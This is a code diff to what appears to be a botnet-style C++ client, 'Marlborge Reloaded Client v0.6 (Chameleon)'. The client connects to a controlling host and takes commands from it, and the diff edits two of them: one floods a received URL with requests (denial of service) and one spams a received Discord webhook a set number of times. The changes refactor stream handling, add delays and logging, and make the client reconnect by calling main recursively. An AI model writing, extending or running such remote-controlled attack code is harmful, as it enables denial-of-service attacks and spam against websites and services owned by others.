@@ -3,6 +3,7 @@
 #include <WS2tcpip.h>
 #include <cpr/cpr.h>
 #include <sstream>
+#include <Windows.h>
 
 #include "DiscordThings.h"
 #include "HTTP.h"
@@ -20,6 +21,7 @@ WSADATA wsaData;
 SOCKET sock;
 sockaddr_in saIn;
 int iResult;
+stringstream ss;
 
 DiscordThings* dcThings;
 HTTP* http;
@@ -28,6 +30,11 @@ char buffer[1024];
 
 void ClearBuffer() {
 	memset(buffer, 0, sizeof(buffer));
+}
+
+void ClearStream() {
+	ss.str("");
+	ss.clear();
 }
 
 void CloseSocket() {
@@ -41,23 +48,31 @@ void CloseSocket() {
 void DoS() {
 	recv(sock, buffer, sizeof(buffer), 0);
 	cout << "Sending requests to the specified URL" << endl;
-	stringstream ss;
 	ss << buffer; string url; ss >> url;
 	http->DoS(url, REQQUANTITY);
 }
 
 void SpamDiscordWebhook() {
-	stringstream ss;
+	cout << "Receiving Webhook" << endl;
 	recv(sock, buffer, sizeof(buffer), 0);
 	ss << buffer; string webhook; ss >> webhook;
+	ClearStream();
 	ClearBuffer();
+	cout << "Receiving Message" << endl;
 	recv(sock, buffer, sizeof(buffer), 0);
 	ss << buffer; string msg; ss >> msg;
+	cout << msg << endl;
+	ClearStream();
 	ClearBuffer();
+	cout << "Receiving Quantity" << endl;
 	recv(sock, buffer, sizeof(buffer), 0);
 	ss << buffer; int quantity; ss >> quantity;
+	ClearStream();
+	ClearBuffer();
 
 	dcThings->SpamDiscordWebhook(webhook, msg, quantity);
+	Sleep(30000);
+	return;
 }
 
 void ConnectSocket() {
@@ -93,7 +108,6 @@ void ConnectSocket() {
 void Listen() {
 	cout << "Listening to the host" << endl;
 	recv(sock, buffer, sizeof(buffer), 0);
-	stringstream ss;
 	ss << buffer; int opt; ss >> opt;
 	ClearBuffer();
 
@@ -109,7 +123,6 @@ void Listen() {
 		break;
 	}
 
-	Listen();
 	return;
 }
 
@@ -117,6 +130,7 @@ int main() {
 	cout << "Marlborge Reloaded Client v0.6 (Chameleon)" << endl;
 	ConnectSocket();
 	Listen();
+	CloseSocket();
 	main();
 
 	return 0;
